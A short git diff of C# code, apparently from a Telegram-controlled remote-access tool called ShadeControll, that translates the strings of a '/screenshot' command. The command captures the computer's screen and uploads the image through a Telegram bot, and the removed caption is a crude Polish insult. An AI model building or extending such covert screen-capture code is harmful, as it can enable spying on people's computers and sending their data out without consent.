@@ -13,7 +13,7 @@ namespace ShadeControll.Commands
         public Screenshot_Command()
         {
             Name = "/screenshot";
-            Description = "Zrobienie zrzutu ekranu komputera.";
+            Description = "Take a screenshot";
         }
 
         public override void Execute(string[] args)
@@ -26,7 +26,7 @@ namespace ShadeControll.Commands
             string fileName = "SCR/" + DateTime.Now.ToString("yyyy-dd-M--HH-mm-ss") + ".jpg";
             captureBitmap.Save(fileName, ImageFormat.Jpeg);
             Thread.Sleep(1000);
-            Program.telegramClient.UploadFile(fileName, "elo pomelo szmaty");
+            Program.telegramClient.UploadFile(fileName, "ScreenShot");
             base.Execute(args);
         }
     }
